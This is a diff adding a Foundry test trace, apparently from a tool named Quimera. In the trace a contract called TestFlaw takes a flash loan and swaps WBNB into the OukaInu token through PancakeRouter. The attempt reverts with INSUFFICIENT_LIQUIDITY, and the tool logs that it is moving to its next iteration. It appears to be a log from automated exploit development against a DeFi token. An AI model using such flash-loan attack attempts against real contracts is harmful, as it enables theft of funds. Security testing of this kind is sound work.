+    │   │   ├─ [52222] TestFlaw::DPPFlashLoanCall(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 262318851386122044250 [2.623e20], 0, 0x307830)
+    │   │   │   ├─ [43664] PancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(262318851386122044250 [2.623e20], 0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x4A33D3ea4B30228C363222746939562FbAba2f01], TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1773226532 [1.773e9])
+    │   │   │   │   ├─ [27325] WBNB::transferFrom(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PancakePair: [0xAA692616034201a3131314197CF9F1e47469E52F], 262318851386122044250 [2.623e20])
+    │   │   │   │   │   ├─ emit Transfer(from: TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: PancakePair: [0xAA692616034201a3131314197CF9F1e47469E52F], value: 262318851386122044250 [2.623e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [2654] OukaInu::balanceOf(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [2893] PancakePair::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0, 0, 0
+    │   │   │   │   ├─ [534] WBNB::balanceOf(PancakePair: [0xAA692616034201a3131314197CF9F1e47469E52F]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 262318851386122044250 [2.623e20]
+    │   │   │   │   └─ ← [Revert] PancakeLibrary: INSUFFICIENT_LIQUIDITY
+    │   │   │   └─ ← [Revert] PancakeLibrary: INSUFFICIENT_LIQUIDITY
+    │   │   └─ ← [Revert] PancakeLibrary: INSUFFICIENT_LIQUIDITY
+    │   └─ ← [Revert] PancakeLibrary: INSUFFICIENT_LIQUIDITY
+    └─ ← [Revert] PancakeLibrary: INSUFFICIENT_LIQUIDITY
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.66s (1.66s CPU time)
+
+Ran 1 test suite in 3.12s (1.66s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Test.t.sol:TestFlaw
+[FAIL: PancakeLibrary: INSUFFICIENT_LIQUIDITY] testFlaw() (gas: 111087)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+2026-03-11 18:57:05,907 [INFO] Quimera: Test failed, continuing to next iteration...
